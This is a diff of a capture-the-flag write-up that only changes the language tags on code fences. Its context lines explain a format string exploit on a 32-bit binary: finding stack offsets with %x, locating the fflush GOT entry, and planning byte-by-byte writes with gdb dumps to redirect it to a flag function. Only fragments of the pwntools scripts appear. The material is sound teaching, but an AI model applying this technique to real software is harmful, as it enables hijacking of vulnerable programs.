@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```console
 $    ./32_new
 Hello baby pwner, whats your name?
 guyinatuxedo
@@ -20,7 +20,7 @@ $    pwn checksec 32_new
 
 So looking at this binary, when we run it it prompts us for input then prints it. We can see that it is a 32 bit binary with no PIE or RELRO. When we take a look at the main function in IDA, we see this:
 
-```
+```c
 void main(void)
 
 {
@@ -42,7 +42,7 @@ void main(void)
 
 So we can see that it scans in our input using `fgets`, copies it and a message over to the `message` variable via sprintf. Then it prints the message using `printf`. The thing is, the way it's printing it is a bug. It's printing it without specifying what format string to use for it (like `%s`, `%x`, or `%p`). As a result, we can specify our own format which we will have it printed as. For example:
 
-```
+```console
 $    ./32_new
 Hello baby pwner, whats your name?
 %x.%x.%x.%x
@@ -53,7 +53,7 @@ We can see there that we have printed off values as four byte hex values. The th
 
 Now let's figure out how to exploit this bug. First we need to see where our input ends up on the stack in reference to the format string bug. In order to do this, we will just give some input and see where it is with `%x` flags:
 
-```
+```console
 $    ./32_new
 Hello baby pwner, whats your name?
 000011112222.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
@@ -66,7 +66,7 @@ Ok cool, soon we will know whether you pwned it or not. Till then Bye 0000111122
 
 So we can see that the offsets for our three four byte values are `10`, `11`, and `12`. Now the reason why these are four bytes is they will store an address that we are writing to, and since this is x86 addresses are four bytes. The reason why there are three of them, is we can only write a number equal to the amount of bytes printf has printed. So writing an entire address like `0x08048574` will cause us to print a huge amount of bytes, and really isn't realistic over a remote connection. So we can split it up into three smaller writes. Now the question is what function will we overwrite the GOT entry of `fflush` with. Looking through the list of functions, we see `flag` at `0x0804870b` looks like a good candidate (no arguments needed):
 
-```
+```c
 
 /* WARNING: Unknown calling convention yet parameter storage is locked */
 /* flag() */
@@ -81,14 +81,14 @@ void flag(void)
 
 If we call this function it will just print the flag. There is one more piece of this puzzle we need to figure out before we can write the exploit. With our write, we write the amount of bytes specified. We can increase the amount of bytes we print by `10` by including `%10x` in our format string. However once we do a write of `10`, all subsequent writes must be less than that. For our first write, we will worry about writing the first byte of the address to `flag` to the got entry for `fflush` which we can find using objdump:
 
-```
+```console
 $    objdump -R 32_new | grep fflush
 0804a028 R_386_JUMP_SLOT   fflush@GLIBC_2.0
 ```
 
 With the second write, we will write the second and third. The fourth write will write the highest byte of the address. However we will get around the fact that subsequent writes can only be greater than or equal to the previous write by overflowing the next spot in memory with it. So whatever value we write for the third write, only the least significant byte will end up in the highest byte for the got entry for `fflush`. To make more sense, let's look at the memory layout of the got entry while we carry out this attack. For that here's a small sample script which will carry out the attack and drop us in gdb to see:
 
-```
+```python
 #Import pwntools
 from pwn import *
 
@@ -123,7 +123,7 @@ target.interactive()
 
 When we run the script and check the memory layout in gdb, we see this:
 
-```
+```gdb
 ─────────────────────────────────────────────────────────────── code:x86:32 ────
     0x80487d0 <main+172>       lea    eax, [ebp-0x138]
     0x80487d6 <main+178>       push   eax
@@ -147,7 +147,7 @@ gef➤  x/2w 0x804a028
 
 So we can see that the value the printf write by default is `0x52`. We need the first byte to be `0x0b` to match the `flag` function's address `0x0804870b`. We will just add `185` bytes to change the value to `0x10b` so the byte there will be `0x0b`. The `0x01` will overflow into the second byte, however that will be overwritten with the second write so we don't need to worry about it yet. When we append `%185x` to the first write and check the memory layout afterwards, we see this:
 
-```
+```gdb
 Breakpoint 1, 0x080487dc in main ()
 gef➤  x/2x 0x0804a028
 0x804a028:    0x0b010b0b    0xf7000001
@@ -155,7 +155,7 @@ gef➤  x/2x 0x0804a028
 
 So we can see that the first byte is `0x0b` which is what it should be. Now for the second write, we need the second and third byte to be equal to `0x0487`, and it is `0x010b`. So we need to add `0x0487 - 0x010b = 892` bytes to get it there. When we add `%892x` to the second write, we see that this is the new address that is written:
 
-```
+```gdb
 Breakpoint 1, 0x080487dc in main ()
 gef➤  x/2x 0x0804a028
 0x804a028:    0x8704870b    0xf7000004
@@ -163,7 +163,7 @@ gef➤  x/2x 0x0804a028
 
 So we can see that all of the bytes with the exception of the fourth byte are correct. Now we just need to add `(0x100 - 0x87) + 0x8 = 129` bytes to get the fourth byte equal to `0x08`. Of course this will spill over to the next dword (if you check the last couple of memory layouts, you can see it's value change as we overwrite part of it). However that value isn't used in anyway that would crash or prevent us from pulling this off, so we don't need to worry about it. When we add the final "bytes printed padding" (if you can call it that) we end up with this exploit:
 
-```
+```python
 #Import pwntools
 from pwn import *
 
@@ -207,7 +207,7 @@ target.interactive()
 
 When we run it:
 
-```
+```console
 $    python exploit.py
 [+] Starting local process './32_new': pid 31622
 Hello baby pwner, whats your name?
